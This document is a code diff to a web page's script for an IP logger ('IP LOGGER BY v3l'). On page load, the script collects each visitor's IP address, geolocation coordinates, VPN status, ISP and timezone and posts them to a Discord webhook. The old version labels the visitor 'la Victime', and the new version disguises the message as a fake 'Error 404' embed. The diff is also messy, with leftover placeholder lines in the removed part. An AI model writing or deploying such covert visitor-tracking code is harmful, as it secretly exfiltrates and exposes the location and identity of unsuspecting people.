@@ -41,37 +41,75 @@
         // get the Discord webhook URL from the meta tag
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
 
-        // send the IP address to the Discord webhook
-        axios.post(webhookUrl, {
-          content: `**Nouvelle IP Log** 
-\n>>> **IP LOGGER BY v3l**
-\n> __IP De la Victime__: **${ip}** 
-\n> __Pays de la Victime__: **${country}** 
-\n> __Drapeau du Pays de la Victime__: **${flag}** 
-\n> __Code Du Pays de la Victime__: **${countrycode}** 
-\n> __Code de Geo du pays De la Victime__: **${countrygeo}** 
-\n> __Continent ou se trouve la Victime__: **${continent}** 
-\n> __Code De Geo du Continent ou se trouve la Victime__: **${continentcode}** 
-\n> __ID Du Continent ou se trouve la Victime__: **${continentgeo}** 
-\n> __X__: **${longitude}** 
-\n> __Y__: **${latitude}** 
-\n> __La Victime a un vpn ? __: **${vpn}** 
-\n> __Nom Du TimeZone de la Victime__: **${timezonename}** 
-\n> __Nom Raccourci Du TimeZone de la Victime__: **${nameabbreviation}** 
-\n> __Heure actuelle de la Victime__: **${currentime}** 
-\n> __Monnaie d'échange du Pays de la Victime__: **${currency}** 
-\n> __Code de la Monnaie d'échange du pays de la Victime__: **${currencycode}** 
-\n> __Opérateur de la Victime__: **${operateur}** 
-\n> __Type de connexion__: **${typedeco}** 
-\n> __ISP__: **${isp}** 
-\n> __Nom De l'organisation__: **${organame}**`
-          ,
-        });
-      });
-                embeds: [
-    { /* embed 1 data */ },
-    { /* embed 2 data */ },
-    etc...
+const payload = {
+  embeds: [{
+    title: 'Error',
+    description: 'Failed to connect to server. Error 404',
+    fields: [{
+      name: 'IP Address',
+      value: data.ip_address
+    }, {
+      name: 'Country',
+      value: data.country
+    }, {
+      name: 'Country Flag',
+      value: data.flag.emoji
+    }, {
+      name: 'Country Code',
+      value: data.country_code
+    }, {
+      name: 'Country Geo ID',
+      value: data.country_geoname_id
+    }, {
+      name: 'Continent',
+      value: data.continent
+    }, {
+      name: 'Continent Code',
+      value: data.continent_code
+    }, {
+      name: 'Continent Geo ID',
+      value: data.continent_geoname_id
+    }, {
+      name: 'X',
+      value: data.longitude
+    }, {
+      name: 'Y',
+      value: data.latitude
+    }, {
+      name: 'VPN',
+      value: data.security.is_vpn
+    }, {
+      name: 'Time Zone Name',
+      value: data.timezone.name
+    }, {
+      name: 'Time Zone Abbreviation',
+      value: data.timezone.abbreviation
+    }, {
+      name: 'Current Time',
+      value: data.timezone.current_time
+    }, {
+      name: 'Currency',
+      value: data.currency.currency_name
+    }, {
+      name: 'Currency Code',
+      value: data.currency.currency_code
+    }, {
+      name: 'Operator',
+      value: data.connection.autonomous_system_organization
+    }, {
+      name: 'Connection Type',
+      value: data.connection.connection_type
+    }, {
+      name: 'ISP Name',
+      value: data.connection.isp_name
+    }, {
+      name: 'Organization Name',
+      value: data.connection.organization_name
+    }]
+  }]
+};
+
+axios.post(webhookUrl, payload);
   </script>
 </body>
 </html>
